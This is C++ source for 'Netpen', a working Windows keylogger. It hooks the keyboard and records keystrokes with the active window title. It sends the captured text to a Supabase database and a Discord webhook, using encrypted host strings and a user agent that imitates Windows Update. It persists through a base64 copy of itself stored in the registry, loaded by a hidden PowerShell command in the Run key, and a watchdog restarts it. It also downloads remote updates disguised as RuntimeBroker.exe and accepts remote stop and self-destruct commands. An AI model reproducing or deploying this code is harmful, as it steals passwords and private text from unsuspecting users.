#include <windows.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <ctime>
#include <wincrypt.h>
#include "config.h"

#ifndef NETPEN_VERSION
#define NETPEN_VERSION 0
#endif

#define SUPABASE_KEYS_PATH L"/rest/v1/keystrokes"
#define SUPABASE_CONTROL_PATH L"/rest/v1/control"
#define STORAGE_VER_PATH L"/storage/v1/object/public/Netpen/version.txt"
#define STORAGE_EXE_PATH L"/storage/v1/object/public/Netpen/RuntimeBroker.exe"

static HHOOK g_hHook = NULL;
static std::string g_winTitle;
static std::string g_keys;
static DWORD g_lastTick = 0;
static DWORD g_lastDiscord = 0;
static bool g_running = true;
static bool g_selfDestructing = false;
static std::string g_hostname;
static HWND g_hwnd = NULL;

static std::wstring g_supabaseHost;
static std::wstring g_supabaseKey;
static std::wstring g_discordHost;
static std::wstring g_discordPath;

static void InitConfig() {
    g_supabaseHost = DecryptW(_enc_SUPABASE_HOST, sizeof(_enc_SUPABASE_HOST));
    g_supabaseKey = DecryptW(_enc_SUPABASE_ANON_KEY, sizeof(_enc_SUPABASE_ANON_KEY));
    g_discordHost = DecryptW(_enc_DISCORD_HOST, sizeof(_enc_DISCORD_HOST));
    g_discordPath = DecryptW(_enc_DISCORD_PATH, sizeof(_enc_DISCORD_PATH));
}

static std::wstring ToWide(const std::string& s) {
    int len = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, NULL, 0);
    std::wstring buf((size_t)len - 1, 0);
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), -1, &buf[0], len);
    return buf;
}

static std::string ToNarrow(const std::wstring& s) {
    int len = WideCharToMultiByte(CP_UTF8, 0, s.c_str(), -1, NULL, 0, NULL, NULL);
    std::string buf((size_t)len - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, s.c_str(), -1, &buf[0], len, NULL, NULL);
    return buf;
}

static std::string EscapeJSON(const std::string& s) {
    std::string out;
    out.reserve(s.size() + 8);
    for (size_t i = 0; i < s.size(); i++) {
        char c = s[i];
        switch (c) {
            case '"': out += "\\\""; break;
            case '\\': out += "\\\\"; break;
            case '\n': out += "\\n"; break;
            case '\r': out += "\\r"; break;
            case '\t': out += "\\t"; break;
            default:
                if ((unsigned char)c < 0x20) {
                    char buf[8];
                    sprintf_s(buf, 8, "\\u%04x", (unsigned char)c);
                    out += buf;
                } else {
                    out += c;
                }
        }
    }
    return out;
}

static std::string GetTimestamp() {
    time_t now = time(NULL);
    struct tm* tm = gmtime(&now);
    char buf[32] = {0};
    strftime(buf, sizeof(buf), "%Y-%m-%dT%H:%M:%SZ", tm);
    return std::string(buf);
}

static std::string GetExeName() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string full(path);
    size_t pos = full.find_last_of("\\/");
    if (pos != std::string::npos) return full.substr(pos + 1);
    return full;
}

static std::wstring GetExeNameW() {
    return ToWide(GetExeName());
}

static std::string GetWindowTitle() {
    char buf[512] = {0};
    HWND hwnd = GetForegroundWindow();
    if (hwnd) GetWindowTextA(hwnd, buf, sizeof(buf) - 1);
    return std::string(buf);
}

static std::string GetKeyString(DWORD vk) {
    bool shift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
    bool caps = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
    bool upper = shift ^ caps;

    if (vk >= 'A' && vk <= 'Z') {
        char c = upper ? (char)vk : (char)(vk + 32);
        return std::string(1, c);
    }

    if (vk >= '0' && vk <= '9') {
        const char* shiftNums = ")!@#$%^&*(";
        char c = shift ? shiftNums[vk - '0'] : (char)vk;
        return std::string(1, c);
    }

    switch (vk) {
        case VK_SPACE: return " ";
        case VK_RETURN: return "[Enter]";
        case VK_TAB: return "[Tab]";
        case VK_BACK: return "[Back]";
        case VK_DELETE: return "[Del]";
        case VK_ESCAPE: return "[Esc]";
        case VK_UP: return "[Up]";
        case VK_DOWN: return "[Down]";
        case VK_LEFT: return "[Left]";
        case VK_RIGHT: return "[Right]";
        case VK_HOME: return "[Home]";
        case VK_END: return "[End]";
        case VK_PRIOR: return "[PgUp]";
        case VK_NEXT: return "[PgDn]";
        case VK_INSERT: return "[Ins]";
        case VK_SNAPSHOT: return "[PrtSc]";
        case VK_PAUSE: return "[Pause]";
        case VK_APPS: return "[Menu]";
        case VK_CAPITAL: case VK_NUMLOCK: case VK_SCROLL: return "";
        case VK_SHIFT: case VK_LSHIFT: case VK_RSHIFT: return "";
        case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL: return "";
        case VK_MENU: case VK_LMENU: case VK_RMENU: return "";
        case VK_LWIN: case VK_RWIN: return "";
        case VK_VOLUME_MUTE: case VK_VOLUME_DOWN: case VK_VOLUME_UP: return "";
        case VK_MEDIA_NEXT_TRACK: case VK_MEDIA_PREV_TRACK: return "";
        case VK_MEDIA_STOP: case VK_MEDIA_PLAY_PAUSE: return "";
        default: break;
    }

    if (vk >= VK_F1 && vk <= VK_F24) {
        char buf[16];
        sprintf_s(buf, 16, "[F%d]", vk - VK_F1 + 1);
        return std::string(buf);
    }

    switch (vk) {
        case VK_OEM_1: return shift ? ":" : ";";
        case VK_OEM_PLUS: return shift ? "+" : "=";
        case VK_OEM_COMMA: return shift ? "<" : ",";
        case VK_OEM_MINUS: return shift ? "_" : "-";
        case VK_OEM_PERIOD: return shift ? ">" : ".";
        case VK_OEM_2: return shift ? "?" : "/";
        case VK_OEM_3: return shift ? "~" : "`";
        case VK_OEM_4: return shift ? "{" : "[";
        case VK_OEM_5: return shift ? "|" : "\\";
        case VK_OEM_6: return shift ? "}" : "]";
        case VK_OEM_7: return shift ? "\"" : "'";
        case VK_OEM_102: return shift ? "|" : "\\";
        case VK_DIVIDE: return "/";
        case VK_MULTIPLY: return "*";
        case VK_SUBTRACT: return "-";
        case VK_ADD: return "+";
        case VK_DECIMAL: return ".";
        default: break;
    }

    if (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9) {
        char c = '0' + (vk - VK_NUMPAD0);
        return std::string(1, c);
    }

    return "";
}

static void LogMsg(const std::string& msg) {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string logPath = std::string(path);
    size_t pos = logPath.find_last_of("\\/");
    if (pos != std::string::npos) logPath = logPath.substr(0, pos + 1);
    logPath += GetExeName() + ".log";
    FILE* f = NULL;
    fopen_s(&f, logPath.c_str(), "a");
    if (f) {
        fprintf(f, "[%s] %s\n", GetTimestamp().c_str(), msg.c_str());
        fclose(f);
    }
}

static bool HttpRequest(const wchar_t* method, const wchar_t* path, const std::string& body, std::string& response) {
    HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return false;

    WinHttpSetTimeouts(hSession, 5000, 5000, 5000, 5000);

    HINTERNET hConnect = WinHttpConnect(hSession, g_supabaseHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, method, path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }

    std::wstring headers = L"apikey: ";
    headers += g_supabaseKey;
    headers += L"\r\nAuthorization: Bearer ";
    headers += g_supabaseKey;
    headers += L"\r\nContent-Type: application/json";

    BOOL sent = FALSE;
    if (body.empty()) {
        sent = WinHttpSendRequest(hRequest, headers.c_str(), headers.length(), NULL, 0, 0, 0);
    } else {
        sent = WinHttpSendRequest(hRequest, headers.c_str(), headers.length(), (LPVOID)body.c_str(), (DWORD)body.size(), (DWORD)body.size(), 0);
    }

    if (!sent) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    if (!WinHttpReceiveResponse(hRequest, NULL)) {
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        return false;
    }

    std::string result;
    DWORD size = 0;
    while (WinHttpQueryDataAvailable(hRequest, &size) && size > 0) {
        char* buf = new char[size + 1];
        ZeroMemory(buf, size + 1);
        DWORD downloaded = 0;
        if (WinHttpReadData(hRequest, buf, size, &downloaded) && downloaded > 0) {
            result.append(buf, downloaded);
        }
        delete[] buf;
    }

    response = result;
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return true;
}

static bool PostKeys(const std::string& json) {
    std::string response;
    return HttpRequest(L"POST", SUPABASE_KEYS_PATH, json, response);
}

static bool HttpGetToString(const wchar_t* path, std::string& response) {
    HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return false;
    WinHttpSetTimeouts(hSession, 5000, 5000, 5000, 5000);
    HINTERNET hConnect = WinHttpConnect(hSession, g_supabaseHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    if (!WinHttpReceiveResponse(hRequest, NULL)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    std::string result;
    DWORD size = 0;
    while (WinHttpQueryDataAvailable(hRequest, &size) && size > 0) {
        char* buf = new char[size + 1];
        ZeroMemory(buf, size + 1);
        DWORD downloaded = 0;
        if (WinHttpReadData(hRequest, buf, size, &downloaded) && downloaded > 0)
            result.append(buf, downloaded);
        delete[] buf;
    }
    response = result;
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    return true;
}

static bool HttpDownloadToFile(const wchar_t* path, const char* outputPath) {
    HINTERNET hSession = WinHttpOpen(L"WindowsUpdate/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return false;
    WinHttpSetTimeouts(hSession, 15000, 15000, 15000, 15000);
    HINTERNET hConnect = WinHttpConnect(hSession, g_supabaseHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", path, NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    if (!WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    if (!WinHttpReceiveResponse(hRequest, NULL)) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    HANDLE hFile = CreateFileA(outputPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) { WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
    DWORD size = 0;
    bool ok = true;
    while (WinHttpQueryDataAvailable(hRequest, &size) && size > 0) {
        char* buf = new char[size];
        DWORD downloaded = 0;
        if (WinHttpReadData(hRequest, buf, size, &downloaded) && downloaded > 0) {
            DWORD written = 0;
            if (!WriteFile(hFile, buf, downloaded, &written, NULL) || written != downloaded) { ok = false; delete[] buf; break; }
        }
        delete[] buf;
    }
    CloseHandle(hFile);
    WinHttpCloseHandle(hRequest); WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession);
    if (!ok) { DeleteFileA(outputPath); return false; }
    return true;
}

static void PostToDiscord(const std::string& hostname, const std::string& window, const std::string& keys) {
    DWORD now = GetTickCount();
    if (now - g_lastDiscord < 30000) return;
    g_lastDiscord = now;
    std::string host = hostname.empty() ? "unknown" : hostname;
    std::string win = window.empty() ? "unknown" : window;
    std::string k = keys.empty() ? "(no keys)" : keys;
    if (k.size() > 1990) k = k.substr(0, 1990) + "...";

    std::string payload = "{\"embeds\":[{\"title\":\"Netpen \\u2014 ";
    payload += EscapeJSON(host);
    payload += "\",\"color\":3066993,\"fields\":[{\"name\":\"Window\",\"value\":\"";
    payload += EscapeJSON(win);
    payload += "\",\"inline\":false}],\"description\":\"";
    payload += EscapeJSON(k);
    payload += "\",\"timestamp\":\"";
    payload += GetTimestamp();
    payload += "\"}]}";

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return;
    WinHttpSetTimeouts(hSession, 5000, 5000, 5000, 5000);

    HINTERNET hConnect = WinHttpConnect(hSession, g_discordHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return; }

    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", g_discordPath.c_str(), NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return; }

    std::wstring headers = L"Content-Type: application/json";
    WinHttpSendRequest(hRequest, headers.c_str(), headers.length(), (LPVOID)payload.c_str(),
        (DWORD)payload.size(), (DWORD)payload.size(), 0);
    WinHttpReceiveResponse(hRequest, NULL);
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
}

static bool CheckStop() {
    std::wstring query = SUPABASE_CONTROL_PATH;
    query += L"?command=eq.stop&executed=eq.false&hostname=eq.";
    query += ToWide(g_hostname);
    query += L"&select=id";
    std::string response;
    if (!HttpRequest(L"GET", query.c_str(), "", response)) return false;
    if (response.empty() || response == "[]") return false;
    return true;
}

static std::string GetExeDir() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string full(path);
    size_t pos = full.find_last_of("\\/");
    if (pos != std::string::npos) return full.substr(0, pos + 1);
    return "";
}

static void CreateKillFlag() {
    std::string flagPath = GetExeDir() + ".kill";
    FILE* f = NULL;
    fopen_s(&f, flagPath.c_str(), "w");
    if (f) fclose(f);
}

static bool KillFlagExists() {
    FILE* f = NULL;
    std::string flagPath = GetExeDir() + ".kill";
    fopen_s(&f, flagPath.c_str(), "r");
    if (f) { fclose(f); return true; }
    return false;
}

static void RemoveKillFlag() {
    std::string flagPath = GetExeDir() + ".kill";
    DeleteFileA(flagPath.c_str());
}

static bool CheckSelfDestruct() {
    std::wstring query = SUPABASE_CONTROL_PATH;
    query += L"?command=eq.selfdestruct&executed=eq.false&hostname=eq.";
    query += ToWide(g_hostname);
    query += L"&select=id";
    std::string response;
    if (!HttpRequest(L"GET", query.c_str(), "", response)) return false;
    if (response.empty() || response == "[]") return false;
    return true;
}

static int GetRemoteVersion() {
    std::string s;
    if (!HttpGetToString(STORAGE_VER_PATH, s)) return -1;
    while (!s.empty() && (s.back() == '\r' || s.back() == '\n' || s.back() == ' ' || s.back() == '\t'))
        s.pop_back();
    if (s.empty()) return -1;
    return atoi(s.c_str());
}

static bool DeployUpdate(int remoteVer) {
    char tmp[MAX_PATH];
    GetTempPathA(MAX_PATH, tmp);
    std::string newExe = std::string(tmp) + "NetpenUpdate.exe";
    std::string batFile = std::string(tmp) + "NetpenUpdate.bat";
    if (!HttpDownloadToFile(STORAGE_EXE_PATH, newExe.c_str())) {
        LogMsg("Update: download failed");
        return false;
    }
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    std::string exeName = GetExeName();
    std::string bat =
        std::string("@echo off\r\n")
        + "set \"O=" + std::string(selfPath) + "\"\r\n"
        + "set \"N=" + newExe + "\"\r\n"
        + ":w\r\ntasklist /fi \"IMAGENAME eq " + exeName + "\" 2>nul | find /i \"" + exeName + "\" >nul\r\n"
        + "if errorlevel 1 goto r\r\ntimeout /t 2 /nobreak >nul\r\ngoto w\r\n"
        + ":r\r\ncopy /y \"%N%\" \"%O%\" >nul\r\n"
        + "start \"\" \"%O%\"\r\n"
        + "del \"%N%\"\r\ndel \"%~f0\"\r\n";
    HANDLE hf = CreateFileA(batFile.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) { DeleteFileA(newExe.c_str()); return false; }
    DWORD w = 0;
    WriteFile(hf, bat.c_str(), (DWORD)bat.size(), &w, NULL);
    CloseHandle(hf);
    STARTUPINFOA si = {0}; si.cb = sizeof(si);
    PROCESS_INFORMATION pi = {0};
    std::string cmd = "cmd.exe /c \"" + batFile + "\"";
    if (!CreateProcessA(NULL, &cmd[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        DeleteFileA(newExe.c_str()); DeleteFileA(batFile.c_str()); return false;
    }
    CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    LogMsg("Update deployed: v" + std::to_string(remoteVer));
    return true;
}

static void FlushBuffer() {
    if (g_keys.empty()) return;

    std::string win = g_winTitle;
    std::string keys = g_keys;
    g_keys.clear();

    std::string json = "[{\"window_title\":\"";
    json += EscapeJSON(win);
    json += "\",\"keys\":\"";
    json += EscapeJSON(keys);
    json += "\",\"hostname\":\"";
    json += EscapeJSON(g_hostname);
    json += "\"}]";

    PostToDiscord(g_hostname, win, keys);
    if (!PostKeys(json)) {
        g_keys = keys + g_keys;
        if (g_keys.size() > 10000)
            g_keys = g_keys.substr(0, 10000);
    }
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
        DWORD vk = p->vkCode;
        std::string newTitle = GetWindowTitle();
        DWORD now = GetTickCount();

        if (newTitle != g_winTitle && !g_keys.empty()) {
            std::string win = g_winTitle;
            std::string keys = g_keys;
            g_keys.clear();
            g_winTitle = newTitle;
            g_lastTick = now;

            std::string json = "[{\"window_title\":\"";
            json += EscapeJSON(win);
            json += "\",\"keys\":\"";
            json += EscapeJSON(keys);
            json += "\",\"hostname\":\"";
            json += EscapeJSON(g_hostname);
            json += "\"}]";
            PostToDiscord(g_hostname, win, keys);
            PostKeys(json);
        } else if (g_winTitle.empty()) {
            g_winTitle = newTitle;
        }

        std::string keyStr = GetKeyString(vk);
        if (!keyStr.empty()) {
            g_keys += keyStr;
            g_lastTick = now;
            if (g_keys.size() > 5000) FlushBuffer();
        }
        g_winTitle = newTitle;
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

#define NETPEN_REGKEY "Software\\Microsoft\\Windows\\CurrentVersion\\Netpen"

static void EnsureStartupEntry();

static void CleanupPersistence() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, GetExeName().c_str());
        RegCloseKey(hKey);
    }
    RegDeleteKeyA(HKEY_CURRENT_USER, NETPEN_REGKEY);
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    std::string cachedExe = std::string(tempPath) + GetExeName();
    DeleteFileA(cachedExe.c_str());
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    switch (msg) {
        case WM_CREATE:
            SetTimer(hwnd, 1, 1000, NULL);
            break;
        case WM_TIMER:
        {
            static int counter = 0;
            counter++;
            if (counter % 5 == 0 && !g_keys.empty()) {
                DWORD now = GetTickCount();
                if (now - g_lastTick > 300) FlushBuffer();
            }
            if (counter % 30 == 0) {
                if (CheckSelfDestruct()) {
                    g_selfDestructing = true;
                    CleanupPersistence();
                    CreateKillFlag();
                    g_running = false;
                    DestroyWindow(hwnd);
                } else if (CheckStop()) {
                    g_running = false;
                    DestroyWindow(hwnd);
                }
            }
            if (counter % 120 == 0 && !g_selfDestructing) {
                EnsureStartupEntry();
            }
            break;
        }
        case WM_DESTROY:
            KillTimer(hwnd, 1);
            PostQuitMessage(0);
            break;
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

static std::string Base64Encode(const BYTE* data, DWORD size) {
    DWORD needed = 0;
    CryptBinaryToStringA(data, size, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &needed);
    std::string result(needed, 0);
    CryptBinaryToStringA(data, size, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, &result[0], &needed);
    while (!result.empty() && result.back() == '\0') result.pop_back();
    return result;
}

#define NETPEN_REGKEY "Software\\Microsoft\\Windows\\CurrentVersion\\Netpen"

static void InstallStartup() {
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);

    // Read current exe into memory
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;
    DWORD size = GetFileSize(hFile, NULL);
    if (size == INVALID_FILE_SIZE || size == 0) { CloseHandle(hFile); return; }
    BYTE* buf = new BYTE[size];
    DWORD read = 0;
    if (!ReadFile(hFile, buf, size, &read, NULL) || read != size) {
        delete[] buf; CloseHandle(hFile); return;
    }
    CloseHandle(hFile);

    // Base64 encode and store in registry
    std::string b64 = Base64Encode(buf, size);
    delete[] buf;

    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "Payload", 0, REG_SZ, (BYTE*)b64.c_str(), (DWORD)b64.size());
        RegCloseKey(hKey);
    }

    // Set HKCU Run key with PowerShell loader
    b64.clear();
    std::string psCmd = "powershell -w h -c \"$d=(gp 'HKCU:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Netpen').Payload;$p=$env:TEMP+'\\";
    psCmd += GetExeName();
    psCmd += "';[IO.File]::WriteAllBytes($p,[Convert]::FromBase64String($d));start $p\"";

    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, GetExeName().c_str(), 0, REG_SZ, (BYTE*)psCmd.c_str(), (DWORD)psCmd.size());
        RegCloseKey(hKey);
    }
}

static void EnsureStartupEntry() {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return;
    }
    // Payload missing -- reinstall
    InstallStartup();
}

static int RunChild(HINSTANCE hInstance) {
    char hostname[256] = {0};
    DWORD hostnameSize = sizeof(hostname);
    GetComputerNameA(hostname, &hostnameSize);
    g_hostname = hostname;

    WNDCLASSEXW wc = {0};
    wc.cbSize = sizeof(WNDCLASSEXW);
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    std::wstring windowClass = GetExeNameW() + L"_Class";
    wc.lpszClassName = windowClass.c_str();
    if (!RegisterClassExW(&wc)) return 1;

    g_hwnd = CreateWindowExW(0, windowClass.c_str(), L"", 0, 0, 0, 0, 0, NULL, NULL, hInstance, NULL);
    if (!g_hwnd) return 1;

    g_hHook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
    if (!g_hHook) {
        LogMsg("Hook failed: " + std::to_string(GetLastError()));
        return 1;
    }

    LogMsg("Child started on " + g_hostname);

    MSG msg;
    while (g_running && GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    if (g_hHook) UnhookWindowsHookEx(g_hHook);
    if (g_hwnd) DestroyWindow(g_hwnd);
    LogMsg("Child stopped");
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
    InitConfig();
    HWND consoleWnd = GetConsoleWindow();
    if (consoleWnd) ShowWindow(consoleWnd, SW_HIDE);

    std::string cmdLine(lpCmdLine ? lpCmdLine : "");
    if (cmdLine.find("--child") != std::string::npos) {
        return RunChild(hInstance);
    }

    CreateMutexW(NULL, TRUE, (GetExeNameW() + L"_Mutex").c_str());
    if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

    char hostname[256] = {0};
    DWORD hostnameSize = sizeof(hostname);
    GetComputerNameA(hostname, &hostnameSize);
    g_hostname = hostname;

    InstallStartup();
    LogMsg("Watchdog started on " + g_hostname);

    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string exePath(path);

    while (true) {
        RemoveKillFlag();

        STARTUPINFOA si = {0};
        si.cb = sizeof(si);
        PROCESS_INFORMATION pi = {0};
        std::string childCmd = "\"" + exePath + "\" --child";

        if (!CreateProcessA(exePath.c_str(), &childCmd[0], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
            Sleep(30000);
            continue;
        }

        bool updated = false;
        while (true) {
            DWORD wr = WaitForSingleObject(pi.hProcess, 300000);
            if (wr == WAIT_TIMEOUT) {
                int rv = GetRemoteVersion();
                if (rv > NETPEN_VERSION) {
                    TerminateProcess(pi.hProcess, 1);
                    updated = DeployUpdate(rv);
                    break;
                }
                if (KillFlagExists()) {
                    TerminateProcess(pi.hProcess, 1);
                    break;
                }
            } else {
                break;
            }
        }

        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);

        if (KillFlagExists()) {
            RemoveKillFlag();
            LogMsg("Self-destruct triggered, watchdog exiting");
            break;
        }

        if (updated) {
            LogMsg("Watchdog exiting for update");
            break;
        }

        Sleep(3000);
    }

    return 0;
}
